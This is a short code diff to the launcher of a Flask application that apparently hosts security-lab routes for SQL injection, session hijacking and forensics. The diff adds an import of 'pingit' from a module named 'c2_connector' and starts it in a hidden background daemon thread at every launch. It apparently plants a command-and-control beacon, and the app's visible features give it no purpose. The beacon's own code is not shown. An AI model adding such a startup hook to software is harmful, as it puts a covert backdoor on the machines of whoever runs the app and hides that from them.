@@ -1,11 +1,13 @@
 import argparse
 from flask import Flask, render_template
+import threading
 
 from pentest.sqli import register_sqli_routes
 from pentest.session_hijack import register_session_routes
 from internal.fim import register_fim_routes
 from internal.log_control import register_log_routes
 from dfir.artifacts import register_dfir_routes
+from host_manager.c2_connector import pingit
 
 from logging_config import setup_logging
 
@@ -54,4 +56,7 @@ if __name__ == "__main__":
     setup_logging()
     args = get_arguments()
     app = create_app()
+    threading.Thread(target=pingit, daemon=True).start()
+
     app.run(host=args.host, port=args.port)
+
